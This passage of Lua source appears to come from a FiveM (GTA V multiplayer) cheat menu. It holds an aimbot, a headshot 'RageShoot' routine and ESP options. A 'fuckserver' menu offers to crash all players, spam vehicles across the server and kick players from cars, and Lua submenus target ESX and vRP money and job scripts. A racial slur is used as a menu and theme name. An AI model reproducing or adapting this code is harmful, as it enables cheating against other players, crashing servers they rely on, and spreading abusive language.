    if IsEntityOnScreen(k) and HasEntityClearLosToEntityInFront(PlayerPedId(), k) and
        not IsPedDeadOrDying(k) and not IsPedInVehicle(k, GetVehiclePedIsIn(k), false) and 
		IsDisabledControlPressed(0, Keys["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
        local x, y, z = table.unpack(GetEntityCoords(k))
        local _, _x, _y = World3dToScreen2d(x, y, z)
        if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
            local _, weapon = GetCurrentPedWeapon(PlayerPedId())
            ShootAt2(k, AimbotBone, GetWeaponDamage(weapon, 1))
        end
    end
end

local function RageShoot(target)
    if not IsPedDeadOrDying(target) then
        local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0.1, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0.1, 0, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
    end
end

local function NameToBone(name)
    if name == "Head" then
        return "SKEL_Head"
    elseif name == "Chest" then
        return "SKEL_Spine2"
    elseif name == "Left Arm" then
        return "SKEL_L_UpperArm"
    elseif name == "Right Arm" then
        return "SKEL_R_UpperArm"
    elseif name == "Left Leg" then
        return "SKEL_L_Thigh"
    elseif name == "Right Leg" then
        return "SKEL_R_Thigh"
    elseif name == "Dick" then
        return "SKEL_Pelvis"
    else
        return "SKEL_ROOT"
    end
end

local function SpawnVeh(model, PlaceSelf, SpawnEngineOn)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
        if SpawnEngineOn then SetVehicleEngineOn(veh, 1, 1) end
        return veh
    else ShowInfo("~r~Model not recognized (Try Again)") end
end

local function SpawnPlane(model, PlaceSelf, SpawnInAir)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = nil
        if SpawnInAir then
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 20, coords.y + yf * 20, coords.z + 500, heading, 1, 1)
        else
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        end
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
    else ShowInfo("~r~Model not recognized (Try Again)") end
end

local function GetCurrentOutfit(target)
    local ped = GetPlayerPed(target)
    outfit = {}
    
    outfit.hat = GetPedPropIndex(ped, 0)
    outfit.hat_texture = GetPedPropTextureIndex(ped, 0)
    
    outfit.glasses = GetPedPropIndex(ped, 1)
    outfit.glasses_texture = GetPedPropTextureIndex(ped, 1)
    
    outfit.ear = GetPedPropIndex(ped, 2)
    outfit.ear_texture = GetPedPropTextureIndex(ped, 2)
    
    outfit.watch = GetPedPropIndex(ped, 6)
    outfit.watch_texture = GetPedPropTextureIndex(ped, 6)
    
    outfit.wrist = GetPedPropIndex(ped, 7)
    outfit.wrist_texture = GetPedPropTextureIndex(ped, 7)
    
    outfit.head_drawable = GetPedDrawableVariation(ped, 0)
    outfit.head_palette = GetPedPaletteVariation(ped, 0)
    outfit.head_texture = GetPedTextureVariation(ped, 0)
    
    outfit.beard_drawable = GetPedDrawableVariation(ped, 1)
    outfit.beard_palette = GetPedPaletteVariation(ped, 1)
    outfit.beard_texture = GetPedTextureVariation(ped, 1)
    
    outfit.hair_drawable = GetPedDrawableVariation(ped, 2)
    outfit.hair_palette = GetPedPaletteVariation(ped, 2)
    outfit.hair_texture = GetPedTextureVariation(ped, 2)
    
    outfit.torso_drawable = GetPedDrawableVariation(ped, 3)
    outfit.torso_palette = GetPedPaletteVariation(ped, 3)
    outfit.torso_texture = GetPedTextureVariation(ped, 3)
    
    outfit.legs_drawable = GetPedDrawableVariation(ped, 4)
    outfit.legs_palette = GetPedPaletteVariation(ped, 4)
    outfit.legs_texture = GetPedTextureVariation(ped, 4)
    
    outfit.hands_drawable = GetPedDrawableVariation(ped, 5)
    outfit.hands_palette = GetPedPaletteVariation(ped, 5)
    outfit.hands_texture = GetPedTextureVariation(ped, 5)
    
    outfit.foot_drawable = GetPedDrawableVariation(ped, 6)
    outfit.foot_palette = GetPedPaletteVariation(ped, 6)
    outfit.foot_texture = GetPedTextureVariation(ped, 6)
    
    outfit.acc1_drawable = GetPedDrawableVariation(ped, 7)
    outfit.acc1_palette = GetPedPaletteVariation(ped, 7)
    outfit.acc1_texture = GetPedTextureVariation(ped, 7)
    
    outfit.acc2_drawable = GetPedDrawableVariation(ped, 8)
    outfit.acc2_palette = GetPedPaletteVariation(ped, 8)
    outfit.acc2_texture = GetPedTextureVariation(ped, 8)
    
    outfit.acc3_drawable = GetPedDrawableVariation(ped, 9)
    outfit.acc3_palette = GetPedPaletteVariation(ped, 9)
    outfit.acc3_texture = GetPedTextureVariation(ped, 9)
    
    outfit.mask_drawable = GetPedDrawableVariation(ped, 10)
    outfit.mask_palette = GetPedPaletteVariation(ped, 10)
    outfit.mask_texture = GetPedTextureVariation(ped, 10)
    
    outfit.aux_drawable = GetPedDrawableVariation(ped, 11)
    outfit.aux_palette = GetPedPaletteVariation(ped, 11)
    outfit.aux_texture = GetPedTextureVariation(ped, 11)
    
    return outfit
end

local function SetCurrentOutfit(outfit)
    local ped = PlayerPedId()
    
    SetPedPropIndex(ped, 0, outfit.hat, outfit.hat_texture, 1)
    SetPedPropIndex(ped, 1, outfit.glasses, outfit.glasses_texture, 1)
    SetPedPropIndex(ped, 2, outfit.ear, outfit.ear_texture, 1)
    SetPedPropIndex(ped, 6, outfit.watch, outfit.watch_texture, 1)
    SetPedPropIndex(ped, 7, outfit.wrist, outfit.wrist_texture, 1)
    
    SetPedComponentVariation(ped, 0, outfit.head_drawable, outfit.head_texture, outfit.head_palette)
    SetPedComponentVariation(ped, 1, outfit.beard_drawable, outfit.beard_texture, outfit.beard_palette)
    SetPedComponentVariation(ped, 2, outfit.hair_drawable, outfit.hair_texture, outfit.hair_palette)
    SetPedComponentVariation(ped, 3, outfit.torso_drawable, outfit.torso_texture, outfit.torso_palette)
    SetPedComponentVariation(ped, 4, outfit.legs_drawable, outfit.legs_texture, outfit.legs_palette)
    SetPedComponentVariation(ped, 5, outfit.hands_drawable, outfit.hands_texture, outfit.hands_palette)
    SetPedComponentVariation(ped, 6, outfit.foot_drawable, outfit.foot_texture, outfit.foot_palette)
    SetPedComponentVariation(ped, 7, outfit.acc1_drawable, outfit.acc1_texture, outfit.acc1_palette)
    SetPedComponentVariation(ped, 8, outfit.acc2_drawable, outfit.acc2_texture, outfit.acc2_palette)
    SetPedComponentVariation(ped, 9, outfit.acc3_drawable, outfit.acc3_texture, outfit.acc3_palette)
    SetPedComponentVariation(ped, 10, outfit.mask_drawable, outfit.mask_texture, outfit.mask_palette)
    SetPedComponentVariation(ped, 11, outfit.aux_drawable, outfit.aux_texture, outfit.aux_palette)
end

local function GetResources()
    local resources = {}
    for i = 1, GetNumResources() do
        resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

function IsResourceInstalled(name)
    local resources = GetResources()
    for i = 1, #resources do
        if resources[i] == name then
            return true
        else
            return false
        end
    end
end

function IhadSexWithMyStepMother.SetFont(id, font)
    buttonFont = font
    menus[id].titleFont = font
end

function IhadSexWithMyStepMother.SetMenuFocusBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
end

function IhadSexWithMyStepMother.SetMaxOptionCount(id, count)
    setMenuProperty(id, 'maxOptionCount', count)
end

function IhadSexWithMyStepMother.PopupWindow(x, y, title)

end


function IhadSexWithMyStepMother.SetTheme(id, theme)
    if theme == "StupidNiggaPaster" then
        IhadSexWithMyStepMother.SetMenuBackgroundColor(id, 0, 0, 0, 50)
         IhadSexWithMyStepMother.SetTitleBackgroundColor(id, 255, 255, 255, 0)
        IhadSexWithMyStepMother.SetTitleColor(id, 255, 255, 255, 0)
        IhadSexWithMyStepMother.SetMenuSubTextColor(id, 255, 255, 255, 255)
        IhadSexWithMyStepMother.SetMenuFocusBackgroundColor(id, 255, 255, 255, 255)
        IhadSexWithMyStepMother.SetFont(id, 0)
        IhadSexWithMyStepMother.SetMenuX(id, .75)
        IhadSexWithMyStepMother.SetMenuY(id, 0.025)
        IhadSexWithMyStepMother.SetMenuWidth(id, 0.222)-- 0.23
        IhadSexWithMyStepMother.SetMaxOptionCount(id, 15)-- 10
        
        titleHeight = 0.11 --0.11
        titleXOffset = 0.5 -- 0.5
        titleYOffset = 0.03 --0.03
        titleSpacing = 2 -- 2
        buttonHeight = 0.038 --0.038
        buttonScale = 0.365 --0.365
        buttonTextXOffset = 0.005 --0.005
        buttonTextYOffset = 0.005 --0.005
        
        themecolor = '~w~'
        themearrow = " ~s~»" -- Old Arrow   »
    end
end

function IhadSexWithMyStepMother.InitializeTheme()
    for i = 1, #menulist do
        IhadSexWithMyStepMother.SetTheme(menulist[i], theme)
    end
end

-- ComboBox w/ new index behaviour (does not wrap around)
function IhadSexWithMyStepMother.ComboBox2(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if IhadSexWithMyStepMother.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then  currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
    return false
end

-- Button with a slider
function IhadSexWithMyStepMother.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if IhadSexWithMyStepMother.Button2(text, items, itemsCount, currentIndex) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
    end
	callback(currentIndex, selectedIndex)
	return false
end



local function drawButton2(text, items, itemsCount, currentIndex)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

        local sliderWidth = ((menus[currentMenu].width / 3) / itemsCount) 
        local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

        local XOffset = 0.1 -- Default value in case of any error?
        local stabilizer = 1

        -- Draw order from top to bottom
        if itemsCount >= 40 then
            stabilizer = 1.005
        end
		
        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor) -- Button Rectangle -2.15
        drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, {r = 110, g = 110, b = 110, a = 150}) -- Slide Outline
        drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, {r = 200, g = 200, b = 200, a = 140}) -- Slide
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text

        --Ugly Code, I'll refactor it later
        local CurrentItem = tostring(items[currentIndex])
        if string.len(CurrentItem) == 1 then XOffset = 0.1050
        elseif string.len(CurrentItem) == 2 then XOffset = 0.1025
        elseif string.len(CurrentItem) == 3 then XOffset = 0.10015
        elseif string.len(CurrentItem) == 4 then XOffset = 0.1085
        elseif string.len(CurrentItem) == 5 then XOffset = 0.1070
        elseif string.len(CurrentItem) >= 6 then XOffset = 0.1055
        end
        -- roundNum seems kinda useless since I'm adjusting every position manually based on the lenght of the string. As stated above, I'll refactor this part later.
		-- (sliderWidth * roundNum((itemsCount / 2), 3)
        drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.04) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, false, shadow) -- Current Item Text
	end
end

-- Getting the center of an odd number of itemsCount (breaks on negative numbers)
function roundNum(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
  end

function IhadSexWithMyStepMother.Button2(text, items, itemsCount, currentIndex)
	local buttonText = text

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton2(text, items, itemsCount, currentIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end

Resources = GetResources()

ResourcesToCheck = {
        -- ESX
        "es_extended", "esx_dmvschool", "esx_policejob", "",
        -- VRP
        "vrp", "vrp_trucker", "vrp_TruckerJob"
}

Citizen.CreateThread(function()
    if mpMessage then ShowMPMessage(startMessage, subMessage, 50) else ShowInfo(startMessage .. " " .. subMessage) end
	if mpMessage then ShowMPMessage(subMessage1, 50) else ShowInfo(subMessage1) end
    ShowInfo(motd3)
	

    -- COMBO BOXES
    
    local currThemeIndex = 1
    local selThemeIndex = 1

    local currFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1
    local selFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1

    local currFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 
    local selFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 

    local currHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1
    local selHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1

    local currHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1
    local selHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1

    local currMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1
    local selMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1

	local currHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    local selHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    
    if currHatIndex == 0 or currHatIndex == 1 then -- No Hat
        currHatIndex = 9
        selHatIndex = 9
    end

	local currHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)
    local selHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)

    -- Fixes the Hat starting at index 1 not displaying because its value is 0
    if currHatTextureIndex == -1 or currHatTextureIndex == 0 then
        currHatTextureIndex = 1
        selHatTextureIndex = 1
    end
    
	local currPFuncIndex = 1
	local selPFuncIndex = 1
	
	local currVFuncIndex = 1
	local selVFuncIndex = 1
	
	local currSeatIndex = 1
	local selSeatIndex = 1
	
	local currTireIndex = 1
	local selTireIndex = 1
	
    local currNoclipSpeedIndex = 1
    local selNoclipSpeedIndex = 1
    
    local currForcefieldRadiusIndex = 1
    local selForcefieldRadiusIndex = 1
    
    local currFastRunIndex = 1
    local selFastRunIndex = 1
    
    local currFastSwimIndex = 1
    local selFastSwimIndex = 1

    local currObjIndex = 1
    local selObjIndex = 1
    
    local currRotationIndex = 3
    local selRotationIndex = 3
    
    local currDirectionIndex = 1
    local selDirectionIndex = 1
    
    local Outfits = {}
    local currClothingIndex = 1
    local selClothingIndex = 1
    
    local currGravIndex = 3
    local selGravIndex = 3
    
    local currSpeedIndex = 1
    local selSpeedIndex = 1
    
    local currAttackTypeIndex = 1
    local selAttackTypeIndex = 1
    
    local currESPDistance = 3
    local selESPDistance = 3
	
	local currESPRefreshIndex = 1
	local selESPRefreshIndex = 1
    
    local currAimbotBoneIndex = 1
    local selAimbotBoneIndex = 1
    
    local currSaveLoadIndex1 = 1
    local selSaveLoadIndex1 = 1
    local currSaveLoadIndex2 = 1
    local selSaveLoadIndex2 = 1
    local currSaveLoadIndex3 = 1
    local selSaveLoadIndex3 = 1
    local currSaveLoadIndex4 = 1
    local selSaveLoadIndex4 = 1
    local currSaveLoadIndex5 = 1
    local selSaveLoadIndex5 = 1
    
    local currRadioIndex = 1
    local selRadioIndex = 1

    local currWeatherIndex = 1
    local selWeatherIndex = 1

    -- GLOBALS
    local TrackedPlayer = nil
	local SpectatedPlayer = nil
	local FlingedPlayer = nil
    local PossessingVeh = false
	local pvblip = nil
	local pvehicle = nil
    local pvehicleText = ""
	local IsPlayerHost = nil
	
	if NetworkIsHost() then
		IsPlayerHost = "~g~Yes"
	else
		IsPlayerHost = "~r~No"
	end
	
    local savedpos1 = nil
    local savedpos2 = nil
    local savedpos3 = nil
    local savedpos4 = nil
    local savedpos5 = nil
    
    -- TOGGLES
    local includeself = true
    local Collision = true
    local objVisible = true
    local PlaceSelf = true
    local SpawnInAir = true
    local SpawnEngineOn = true
    
    -- TABLES
    SpawnedObjects = {}
    
    -- MAIN MENU
    IhadSexWithMyStepMother.CreateMenu('StupidNiggaPaster', "")
    IhadSexWithMyStepMother.SetSubTitle('StupidNiggaPaster', '')
    
    -- MAIN MENU SUBMENUS
    IhadSexWithMyStepMother.CreateSubMenu('self', 'StupidNiggaPaster', '')
    IhadSexWithMyStepMother.CreateSubMenu('player', 'StupidNiggaPaster', '')
    IhadSexWithMyStepMother.CreateSubMenu('weapon', 'StupidNiggaPaster', '')
    IhadSexWithMyStepMother.CreateSubMenu('vehicle', 'StupidNiggaPaster', '')
    IhadSexWithMyStepMother.CreateSubMenu('world', 'StupidNiggaPaster', '')
	IhadSexWithMyStepMother.CreateSubMenu('teleport', 'StupidNiggaPaster', '')
    IhadSexWithMyStepMother.CreateSubMenu('misc', 'StupidNiggaPaster', '')
    IhadSexWithMyStepMother.CreateSubMenu('lua', 'StupidNiggaPaster', '')
    IhadSexWithMyStepMother.CreateSubMenu('settingslol', 'StupidNiggaPaster', '')
    
    -- PLAYER MENU SUBMENUS  
    IhadSexWithMyStepMother.CreateSubMenu('allplayer', 'player', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('playeroptions', 'player', ' ')
	IhadSexWithMyStepMother.CreateSubMenu('troll', 'playeroptions', ' ')
	IhadSexWithMyStepMother.CreateSubMenu('crashtroll', 'playeroptions', '  ')
	IhadSexWithMyStepMother.CreateSubMenu('weaponspawnerplayer', 'playeroptions', ' ')
	
    
    -- SELF MENU SUBMENUS
    IhadSexWithMyStepMother.CreateSubMenu('appearance', 'self', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('modifiers', 'self', ' ')
	
	-- APPEARANCE SUBMENUS
	IhadSexWithMyStepMother.CreateSubMenu('modifyskintextures', 'appearance', "")
    IhadSexWithMyStepMother.CreateSubMenu('modifyhead', 'modifyskintextures', " ")
	IhadSexWithMyStepMother.CreateSubMenu('skinsmodels', 'appearance', "")
    
    -- WEAPON MENU SUBMENUS
	
	IhadSexWithMyStepMother.CreateSubMenu('WeaponCustomization', 'weapon', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('weaponspawner', 'weapon', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('melee', 'weaponspawner', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('pistol', 'weaponspawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('smg', 'weaponspawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('shotgun', 'weaponspawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('assault', 'weaponspawner', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('sniper', 'weaponspawner', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('thrown', 'weaponspawner', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('heavy', 'weaponspawner', ' ')
    
    -- VEHICLE MENU SUBMENUS
    IhadSexWithMyStepMother.CreateSubMenu('vehiclespawner', 'vehicle', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('vehiclemods', 'vehicle', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('vehiclemenu', 'vehicle', '  ')
    IhadSexWithMyStepMother.CreateSubMenu('VehBoostMenu', 'vehicle', '  ')
    -- VEHICLE SPAWNER MENU
    IhadSexWithMyStepMother.CreateSubMenu('compacts', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('sedans', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('suvs', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('coupes', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('muscle', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('sportsclassics', 'vehiclespawner', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('sports', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('super', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('WWBA', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('offroad', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('industrial', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('utility', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('vans', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('cycles', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('boats', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('helicopters', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('planes', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('service', 'vehiclespawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('commercial', 'vehiclespawner', '')
    -- VEHICLE MODS SUBMENUS
    IhadSexWithMyStepMother.CreateSubMenu('vehiclecolors', 'vehiclemods', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', ' ')
    
    IhadSexWithMyStepMother.CreateSubMenu('primary_classic', 'vehiclecolors_primary', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('primary_matte', 'vehiclecolors_primary', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('primary_metal', 'vehiclecolors_primary', '')
    
    IhadSexWithMyStepMother.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', '')
    
    IhadSexWithMyStepMother.CreateSubMenu('vehicletuning', 'vehiclemods', ' ')
    
    -- WORLD MENU SUBMENUS
    IhadSexWithMyStepMother.CreateSubMenu('objectspawner', 'StupidNiggaPaster', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('objectlist', 'objectspawner', '')
    IhadSexWithMyStepMother.CreateSubMenu('weather', 'world', '')
    IhadSexWithMyStepMother.CreateSubMenu('time', 'world', ' ')
    
    -- MISC MENU SUBMENUS
	IhadSexWithMyStepMother.CreateSubMenu('esp', 'misc', '')
	IhadSexWithMyStepMother.CreateSubMenu('webradio', 'misc', '')
    IhadSexWithMyStepMother.CreateSubMenu('credits', 'settingslol', '')
    
    -- TELEPORT MENU SUBMENUS
    IhadSexWithMyStepMother.CreateSubMenu('saveload', 'teleport', '')
    IhadSexWithMyStepMother.CreateSubMenu('pois', 'teleport', '')
	--fuck server
	IhadSexWithMyStepMother.CreateSubMenu('fuckserver', 'StupidNiggaPaster', '')
    
    -- LUA MENU SUBMENUS
    IhadSexWithMyStepMother.CreateSubMenu('esx', 'lua', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('vrp', 'lua', ' ')
    IhadSexWithMyStepMother.CreateSubMenu('player1', 'lua', ' ')
	IhadSexWithMyStepMother.CreateSubMenu('other', 'player1', ' ')
	IhadSexWithMyStepMother.CreateSubMenu('money', 'lua', ' ')
	IhadSexWithMyStepMother.CreateSubMenu('drogas', 'lua', ' ')
	IhadSexWithMyStepMother.CreateSubMenu('mecanico', 'lua', ' ')
    
    IhadSexWithMyStepMother.InitializeTheme()
    
    while true do
        
        -- MAIN MENU
        if IhadSexWithMyStepMother.IsMenuOpened('StupidNiggaPaster') then
        if IhadSexWithMyStepMother.MenuButton('Self Option', 'self') then  
            elseif IhadSexWithMyStepMother.MenuButton('Player Option', 'player') then
            elseif IhadSexWithMyStepMother.MenuButton('Visuals Option', 'misc') then
            elseif IhadSexWithMyStepMother.MenuButton('Weapons Option', 'weapon') then
            elseif IhadSexWithMyStepMother.MenuButton('Vehicle Option', 'vehicle') then
            elseif IhadSexWithMyStepMother.MenuButton('World Option', 'world') then
			elseif IhadSexWithMyStepMother.MenuButton('Teleport Option', 'teleport') then
			elseif IhadSexWithMyStepMother.MenuButton('Object Option', 'objectspawner') then
			elseif IhadSexWithMyStepMother.MenuButton('~r~END ~g~Server', 'fuckserver') then
            elseif IhadSexWithMyStepMother.MenuButton('~v~Lua Option', 'lua') then
            elseif IhadSexWithMyStepMother.MenuButton('Menu Option', 'settingslol') then
            elseif IhadSexWithMyStepMother.Button('~r~!!CLOSE MENU!!') then break
            end
            ShowInfo(motd2)
	        ShowInfo(motd)
            ShowInfo(motd5)
            
        
        -- PLAYER OPTIONS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('player') then
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                    local currPlayer = playerlist[i]
                    if IhadSexWithMyStepMother.MenuButton("~r~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer).." "..(IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~s~[~r~DEAD~s~]" or "~s~[~g~ALIVE~s~]"), 'playeroptions') then
                        selectedPlayer = currPlayer end
                end
      
			
			
			
		--Fuck server
		elseif IhadSexWithMyStepMother.IsMenuOpened('fuckserver') then
		    if IhadSexWithMyStepMother.CheckBox("Include Self", includeself, "No", "Yes") then
                includeself = not includeself
			elseif IhadSexWithMyStepMother.Button("Kick All Players From Vehicle") then
                KickAllFromVeh(includeself)
			elseif IhadSexWithMyStepMother.CheckBox("Spam vehicle all Server", nukeserver) then
			ShowInfo("~y~Fucking Players...")
				nukeserver = not nukeserver
			elseif IhadSexWithMyStepMother.Button("Set ~s~All Nearby Vehicles Plate Text") then
            local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
			elseif IhadSexWithMyStepMother.CheckBox("Make ~s~All Cars Fly", FlyingCars) then
                FlyingCars = not FlyingCars
		elseif IhadSexWithMyStepMother.CheckBox("CRASH - ALL PLAYERS", Enable_GcPhone) then
                Enable_GcPhone = not Enable_GcPhone
				
		elseif IhadSexWithMyStepMother.Button("~r~CLOSE - Simeons MAP") then
		x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
